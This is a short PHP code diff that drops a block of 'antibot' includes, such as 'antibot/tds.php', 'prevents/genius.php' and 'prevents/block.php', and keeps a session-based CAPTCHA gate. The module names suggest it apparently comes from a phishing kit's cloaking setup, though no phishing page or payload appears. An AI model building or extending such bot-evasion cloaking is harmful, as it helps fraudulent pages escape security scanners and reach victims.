@@ -21,20 +21,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['captcha_answer'])) {
     }
 }
 
-// IMPORTANT: Keep antibot bypassed to use the new CAPTCHA system
+// IMPORTANT: ALWAYS bypass antibot to use the new CAPTCHA system
 $bypass_antibot = true;
-
-// Only include antibot if explicitly needed (not recommended for production)
-if (!$bypass_antibot) {
-    include './antibot.php';
-    include './antibot/tds.php';
-    include './prevents/genius.php';
-    include './antibot/tds.php';
-    include './prevents/anti.php';
-    include './prevents/anti2.php';
-    include './prevents/sub_anti.php';
-    include './prevents/block.php';
-}
 
 // Check if captcha is already verified
 if (!isset($_SESSION['captcha_verified']) || $_SESSION['captcha_verified'] !== true) {
